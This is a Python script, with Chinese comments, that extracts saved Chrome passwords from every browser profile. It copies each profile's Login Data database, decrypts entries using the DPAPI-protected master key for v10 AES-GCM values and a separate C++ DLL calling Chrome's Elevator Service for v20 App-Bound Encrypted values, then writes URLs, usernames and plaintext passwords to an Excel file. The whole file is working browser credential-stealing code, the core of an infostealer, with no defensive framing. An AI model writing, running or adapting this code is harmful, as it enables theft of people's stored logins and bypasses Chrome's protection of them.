import os
import json
import base64
import sqlite3
import shutil
import re
import ctypes
import pandas as pd
from Cryptodome.Cipher import AES
from win32 import win32crypt

# --- 路徑與配置 ---
CHROME_USER_DATA = os.path.join(os.environ["LOCALAPPDATA"], "Google", "Chrome", "User Data")
LOCAL_STATE_PATH = os.path.join(CHROME_USER_DATA, "Local State")
TEMP_DB = "chrome_temp_vault.db"
DLL_PATH = os.path.abspath("abe_decryptor.dll")

# --- 載入 C++ DLL ---
try:
    abe_lib = ctypes.WinDLL(DLL_PATH)
    # 定義函數原型: int DecryptABE(BYTE* cipher, int len, char* out, int* out_len)
    abe_lib.DecryptABE.argtypes = [ctypes.POINTER(ctypes.c_ubyte), ctypes.c_int, ctypes.c_char_p, ctypes.POINTER(ctypes.c_int)]
except Exception as e:
    print(f"[警告] 無法載入 ABE DLL: {e}。v20 資料將無法解密。")
    abe_lib = None

def get_master_key():
    try:
        with open(LOCAL_STATE_PATH, "r", encoding="utf-8") as f:
            local_state = json.load(f)
        encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
        return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
    except:
        return None

def call_abe_dll(ciphertext):
    """透過 C++ DLL 呼叫 Chrome Elevator Service 解密 v20"""
    if not abe_lib: return "(缺少 DLL)"
    
    cipher_len = len(ciphertext)
    out_buffer = ctypes.create_string_buffer(1024)
    out_len = ctypes.c_int(1024)
    c_cipher = (ctypes.c_ubyte * cipher_len).from_buffer_copy(ciphertext)
    
    res = abe_lib.DecryptABE(c_cipher, cipher_len, out_buffer, ctypes.byref(out_len))
    if res == 0:
        return out_buffer.value[:out_len.value].decode('utf-8', errors='ignore')
    return f"(ABE 拒絕: {hex(res & 0xFFFFFFFF)})"

def decrypt_password(ciphertext, key):
    if not ciphertext or len(ciphertext) < 15: return ""
    
    prefix = ciphertext[:3]
    
    # 情況 A: v20 (App-Bound Encryption) -> 必須用 C++
    if prefix == b'v20':
        return call_abe_dll(ciphertext)
        
    # 情況 B: v10 (標準 AES-GCM) -> 用 Python 即可
    if prefix == b'v10':
        try:
            iv, payload, tag = ciphertext[3:15], ciphertext[15:-16], ciphertext[-16:]
            cipher = AES.new(key, AES.MODE_GCM, iv)
            return cipher.decrypt_and_verify(payload, tag).decode('utf-8', errors='ignore')
        except:
            return "(v10 解密失敗)"
            
    # 情況 C: 舊版 DPAPI
    try:
        return win32crypt.CryptUnprotectData(ciphertext, None, None, None, 0)[1].decode('utf-8')
    except:
        return "(未知加密格式)"

def main():
    print("=== Chrome ABE 混合解密工具 (Python + C++) ===")
    master_key = get_master_key()
    if not master_key: return

    profiles = [d for d in os.listdir(CHROME_USER_DATA) if d == "Default" or d.startswith("Profile")]
    all_results = []

    for profile in profiles:
        db_path = os.path.join(CHROME_USER_DATA, profile, "Login Data")
        if not os.path.exists(db_path): continue
        
        print(f"正在掃描: {profile}")
        shutil.copy2(db_path, TEMP_DB)
        conn = sqlite3.connect(TEMP_DB)
        cursor = conn.cursor()
        
        try:
            cursor.execute("SELECT action_url, username_value, password_value FROM logins")
            for url, user, cryp_pass in cursor.fetchall():
                if user or url:
                    pwd = decrypt_password(cryp_pass, master_key)
                    all_results.append({
                        "Profile": profile,
                        "URL": url,
                        "User": user,
                        "Password": pwd
                    })
        except Exception as e:
            print(f" 錯誤: {e}")
        finally:
            conn.close()
            if os.path.exists(TEMP_DB): os.remove(TEMP_DB)

    if all_results:
        df = pd.DataFrame(all_results)
        # 修正 Pandas 2.1+ 的 map 用法，清理控制字元
        df = df.map(lambda x: re.sub(r'[\x00-\x1f\x7f-\x9f]', '', str(x)) if isinstance(x, str) else x)
        df.to_excel("Chrome_Full_Report.xlsx", index=False)
        print(f"\n完成！已匯出 {len(all_results)} 筆資料至 Chrome_Full_Report.xlsx")
    else:
        print("未偵測到密碼。")

if __name__ == "__main__":
    main()